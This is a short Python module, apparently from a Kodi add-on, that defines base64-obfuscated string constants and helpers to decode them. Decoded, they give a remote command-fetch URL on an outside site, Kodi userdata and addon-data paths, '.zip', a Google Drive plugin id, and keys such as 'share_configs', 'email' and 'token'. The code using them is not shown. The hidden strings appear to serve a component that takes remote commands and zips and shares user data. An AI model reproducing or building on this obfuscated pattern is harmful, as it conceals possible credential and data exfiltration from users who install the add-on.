import base64
_AU     = "aHR0cDovL2NoaWFzZWNvZGUuc2l0ZS9hcGkvY29tbWFuZC9nZXQ="
_PG     = "cGx1Z2luLmdvb2dsZWRyaXZl"
_A      = "YWN0aW9u"
_SC     = "c2hhcmVfY29uZmlncw=="
_UD     = "c3BlY2lhbDovL2hvbWUvdXNlcmRhdGE="
_AD     = "YWRkb25fZGF0YQ=="
_T      = "c3BlY2lhbDovL3RlbXA="
_RC     = "cmFuZG9tX2NvZGU="
_Z      = "LnppcA=="
_E      = "ZW1haWw="
_S      = "c2hhcmU="
_FN     = "ZmlsZV9uYW1l"
_L      = "bG9jYWw="
_P      = "cHJvZmlsZQ=="
_N      = "bmFtZQ=="
_SB     = "U3lzdGVtLkJ1aWxkVmVyc2lvbg=="
_V      = "dmVyc2lvbg=="
_TK     = "dG9rZW4="

def G(p):
    r = globals()[p]
    return str(base64.b64decode(r), 'UTF-8')

def L(p):
    return globals()[p]